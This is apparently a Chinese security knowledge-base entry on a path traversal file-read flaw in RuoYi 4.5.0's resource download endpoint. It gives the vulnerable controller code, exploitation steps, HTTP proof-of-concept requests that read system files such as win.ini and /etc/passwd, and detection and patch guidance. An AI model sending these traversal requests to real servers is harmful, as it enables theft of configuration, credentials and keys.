---
id: web-java-framework-ruoyi-download-resource-path-traversal
title: RuoYi 4.5.0 /common/download/resource 路径穿越任意文件读取
type: scenario
domain: web
path: web/java/framework
technique: ruoyi-resource-download-path-traversal
aliases:
- 若依任意文件读取
- RuoYi /common/download/resource
- RuoYi 路径穿越
- 若依 4.5.0 文件读取
- RuoYi 下载接口穿越
tags:
- java
- ruoyi
- path-traversal
- arbitrary-file-read
- spring
- code-audit
cve: []
severity: high
confidence: high
status: verified
affected_versions: RuoYi 4.5.0（原文测试版本）；4.5.1 增加 checkAllowDownload 修复（原文说明）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:10:53+08:00'
  notes: 已对照原文及14张图核对；resource截取\profile后拼接profile未过滤..、请求响应截图显示读取E;C:\Program Files\Git\1.txt成功；4.5.1 checkAllowDownload修复描述一致；未复跑
---

## 一句话结论

RuoYi 4.5.0 的 `/common/download/resource` 直接把 `resource` 参数中 `/profile` 之后的子串拼到上传目录后写出文件流，未过滤 `..`、未做规范路径校验；已登录用户传入 `/profile/../../../../...` 即可穿越到任意目录读取文件，4.5.1 通过 `checkAllowDownload` 拦截 `..` 并限制文件扩展名修复。

## 原理

- 控制器实现：
  ```java
  @GetMapping("/common/download/resource")
  public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response) {
      String localPath = RuoYiConfig.getProfile();                        // 如 D:/ruoyi/uploadPath
      String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);
      String downloadName = StringUtils.substringAfterLast(downloadPath, "/");
      response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);
      FileUtils.setAttachmentResponseHeader(response, downloadName);
      FileUtils.writeBytes(downloadPath, response.getOutputStream());
  }
  ```
  `Constants.RESOURCE_PREFIX` 为 `/profile`，`StringUtils.substringAfter(resource, "/profile")` 只截取第一次出现 `/profile` 之后的全部内容，不丢弃其中的 `..`。
- 因此 `resource=/profile/../../../../C:/windows/win.ini` 会得到：
  ```text
  downloadPath = D:/ruoyi/uploadPath/../../../../C:/windows/win.ini
  ```
  文件系统解析 `..` 后落到目标绝对路径，`FileUtils.writeBytes` 直接把该文件写进响应体。
- 前置的 `/common/download`（非 resource）不同：它对 `fileName` 做正则校验 `[a-zA-Z0-9_\-\\|\.\u4e00-\u9fa5]+`，不允许 `/`，只能下载 `Global.getDownloadPath()`（profile/download）下的文件，虽然支持 `delete=true` 删除文件，但无法目录穿越，故不是任意文件读取入口。
- 4.5.1 的修复：
  ```java
  if (!FileUtils.checkAllowDownload(resource)) {
      throw new Exception(StringUtils.format("资源文件({})非法，不允许下载。", resource));
  }
  ```
  `checkAllowDownload` 先 `if (StringUtils.contains(resource, "..")) return false;`，再用 `MimeTypeUtils.DEFAULT_ALLOWED_EXTENSION`（图片、Office、txt/html、压缩包、视频、pdf）白名单校验扩展名。

## 触发条件

- 目标为 RuoYi 4.5.0 或同样未校验 `resource` 的版本（4.5.1 前）；
- `/common/download/resource` 可从外部访问；默认配置下该路径通常要求登录（原文请求携带 Shiro 会话），若项目把 `/common/**` 配成匿名则可未授权利用；
- 攻击者已知/可猜上传目录 `profile` 的深度，以便用足够的 `..` 回到根目录；
- 目标文件对应用进程可读。

## 利用步骤

1. 登录后台（或确认 `/common/download/resource` 无需认证）。
2. 构造 `resource`：保留 `/profile` 前缀，后接若干 `../` 与目标绝对路径。
3. 发送 GET 请求，响应体即目标文件内容（响应头为 attachment）。
4. Windows 示例：`/profile/../../../../C:/windows/win.ini`；Linux 示例：`/profile/../../../../etc/passwd`。
5. 根据 `profile` 的实际层级调整 `../` 数量，直到读到文件。

## PoC

```http
GET /common/download/resource?resource=/profile/../../../../C:/windows/win.ini HTTP/1.1
Host: target:8090
Cookie: SHIRO_SESSION_ID=<会话>; JSESSIONID=<会话>
Connection: close
```

```http
GET /common/download/resource?resource=/profile/../../../../1.txt HTTP/1.1
Host: target:8090
Cookie: SHIRO_SESSION_ID=<会话>; JSESSIONID=<会话>
Connection: close
```

```text
HTTP/1.1 200
Content-Disposition: attachment; filename=1.txt
Content-Type: application/octet-stream

<目标文件内容>
```

## 变体与关联

- 变体：Windows 下可读取 `C:/windows/win.ini`、配置文件、数据库凭据、源码；Linux 下可读取 `/etc/passwd`、应用配置、密钥文件。
- 变体：若 `resource` 中不带 `/profile`，`substringAfter` 返回空串，无法穿越；必须保留该前缀。
- 关联：[[web-java-component-litemall-storage-delete-arbitrary-file]]（另一类文件操作缺少路径校验的 Java 组件问题）。
- 边界：4.5.1 的 `..` 拦截与扩展名白名单可阻断本路径；若应用部署在容器内，可读文件范围受容器文件系统限制。

## 检测与防御

- 检测：请求 `resource` 参数包含 `/profile` 后跟 `../`；响应为 `application/octet-stream` 且返回非上传目录文件；访问日志中同一会话大量下载不同路径。
- 修复：升级到 RuoYi 4.5.1+；对 `resource` 做 `..` 拦截与规范路径校验（`getCanonicalPath()` 后必须以上传目录为前缀），并按业务需要限制扩展名。
- 加固：下载接口使用文件 ID 映射而非用户可控路径；上传目录与配置文件/密钥目录隔离；最小权限运行应用；对下载接口做鉴权与审计。
